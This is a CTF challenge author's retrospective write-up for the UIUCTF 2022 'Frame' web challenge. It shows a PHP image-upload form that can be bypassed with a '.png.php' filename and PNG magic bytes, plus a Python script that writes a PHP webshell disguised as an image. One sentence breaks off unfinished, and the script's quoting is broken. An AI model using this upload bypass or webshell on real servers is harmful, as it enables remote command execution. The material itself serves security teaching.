# "Frame" Solution Writeup

"Frame" was a beginner web challenge I helped write for UIUCTF 2022. This challenge was intended to teach the user about file upload vulnerabilities and file signatures (sometimes called "magic bytes").

At the time of creation, UIUCTF didn't have a policy of releasing solution documents after our writeup competition deadline had passed, so this challenge went without an official writeup for a while. With a bit more experience under my belt, I figured I'd turn this into a unique opportunity to look back at my work and explain the challenge with fresh eyes.

> This writeup is a retrospective of a challenge I helped create for UIUCTF 2022. The original challenge and its files can be found in the [UIUCTF 2022 Public Release Repository](https://github.com/sigpwny/UIUCTF-2022-Public/tree/main/web/frame).

## Planning

First, the user sees a challenge description:

```
We made it easy to add a frame to your digital art!

https://frame-web.chal.uiuc.tf/
```

We additionally provided the user a handout, which besides the flag, consists of the `challenge` folder in our [public release](https://github.com/sigpwny/UIUCTF-2022-Public/tree/main/web/frame/challenge).

### File Upload Footer Check

Looking at the source code provided, we can see that the website is meant to take the input of an image file and add an ornate frame around the user's picture:

```php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
          if (isset($_POST["submit"])) {
            $allowed_extensions = array(".jpg", ".jpeg", ".png", ".gif");
            $filename = $_FILES["fileToUpload"]["name"];
            $tmpname = $_FILES["fileToUpload"]["tmp_name"];
            $target_file = "uploads/" . bin2hex(random_bytes(8)) . "-" .basename($filename);

            $has_extension = false;
            foreach ($allowed_extensions as $extension) {
              if (strpos(strtolower($filename), $extension) !== false) {
                $has_extension = true;
              }
            }
            
            if ($_FILES["fileToUpload"]["size"] < 2000000) {
              if (getimagesize($tmpname) && $has_extension) {
                if (move_uploaded_file($tmpname, $target_file)) {     
                  echo "<div id='frame'><img src='$target_file' alt='Your image failed to load :(' id='submission'></div>";
                } else {
                  echo "There was an error uploading your file. Please contact an admin.";
                }
              } else {
                echo "Your picture is not a picture and could not be framed.";
              }
            } else {
              echo "Your picture is too large for us to process.";
            }
          }
        ?>
```

This is the only input present, so that narrows down the focus to file upload vulnerabilities right away.

### File Upload Header Check

If we look closer, we can see how the website checks that the image is actually a picture file:

```php
$allowed_extensions = array(".jpg", ".jpeg", ".png", ".gif");
$filename = $_FILES["fileToUpload"]["name"];
$tmpname = $_FILES["fileToUpload"]["tmp_name"];
$target_file = "uploads/" . bin2hex(random_bytes(8)) . "-" .basename($filename);

$has_extension = false;
foreach ($allowed_extensions as $extension) {
    if (strpos(strtolower($filename), $extension) !== false) {
    $has_extension = true;
    }
}
```

Of note is the fact that we check that the filename includes the correct exxtension, but not necessarily the location in the filename of that extension. You could then, for example, validly submit `image.png.php`. So we found the main vulnerability, but there's still one more security check we need to look at:

```php
if (getimagesize($tmpname) && $has_extension)
...
else {
    echo "Your picture is not a picture and could not be framed.";
```

The function `getimagesize` in PHP outputs the size of a file in the form of an array. The official documentation can be found [at this link](https://www.php.net/manual/en/function.getimagesize.php) if you want more details, but I'll highlight the relevant details for this challenge. In particular, while this function does properly parse image files, it does not make full security checks and warns to use a more proper image check. With that in mind, we just need to make sure that the file parses as an "image".

If you're unfamiliar with how files are parsed, generally a function like this would figure out the intended contents by looking at the file signature. This is a string of bytes that all files of a particular type have (for example, zip files might use the byes `50 4B 03 04`).

So what we can do is include the file signature of a valid png file, which would include the bytes `89 50 4E 47 0D 0A 1A 0A`, and insert that at the start of the file. If you want to experiment with other file signatures, the [Wikipedia article](https://en.wikipedia.org/wiki/List_of_file_signatures) is honestly a great resource.

### Determining the Goal

In the Dockerfile, we can see where the flag was placed:

```dockerfile
COPY flag /
```

So if we get a webshell for the file, we should be able to read the flag from the root file. There don't appear to be any major limitations on this beyond file size, so we can just use a classic webshell like `<?php system($_GET['cmd']);?>`, which allows the attacker to add commands as a parameter to website queries, in this case on the page that the "picture" is uploaded to. This might look like `

## Putting It Together

Now that we know what we need to do to make the file valid, we can craft an exploit. For ease of understanding, I wrote a script to create the file that will result in a valid submission to a webshell:

```py
# This script creates a file named "image.png.php" that is read as a PNG file, but is really a PHP file.

with open("image.png.php", 'wb') as f:
    # This is a PNG header, ‰PNG␍␊␚␊
    f.write(b'\x89PNG\r\n\x1a\n')
    
    # Our payload can be any PHP code that helps us read the flag file
    f.write(b'<?php system($_GET['cmd']);?>')
```
Once you upload the webshell, you'll be able to access the filesystem and so long as you're familiar with basic bash commands, you'll be able to find the flag.

## Wrap-up

This was the first challenge I ever helped write, so it holds a special place in my heart. While being able to contribute to a pretty well known CTF as a security beginner is certainly an uncommon situation to be in, I think that folks can learn a ton about computer security from helping write some CTF challenges and teaching others how to hack has really solidified my skills over the years. I certainly was stepping out of my comfort zone with this challenge at the time and it was pretty frustrating, but looking back I wouldn't have had it any other way.

For those of you new to the CTF space, I hope this writeup was as helpful for you to read as it was for me to reflect back on.
